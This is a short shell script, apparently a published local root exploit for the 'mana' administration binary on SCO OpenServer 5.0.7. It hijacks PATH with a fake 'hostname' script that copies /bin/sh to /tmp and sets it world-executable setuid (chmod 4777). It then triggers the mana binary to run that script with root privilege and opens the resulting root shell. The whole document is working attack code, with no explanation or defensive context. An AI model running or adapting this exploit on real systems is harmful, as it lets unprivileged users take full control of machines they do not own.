#!/bin/sh
#
# OpenServer 5.0.7 - Local mana root shell
#
#

REMOTE_ADDR=127.0.0.1
PATH_INFO=/pass-err.mana
PATH=./:$PATH

export REMOTE_ADDR
export PATH_INFO
export PATH

echo "cp /bin/sh /tmp;chmod 4777 /tmp/sh;" > hostname

chmod 755 hostname

/usr/internet/admin/mana/mana > /dev/null

/tmp/sh

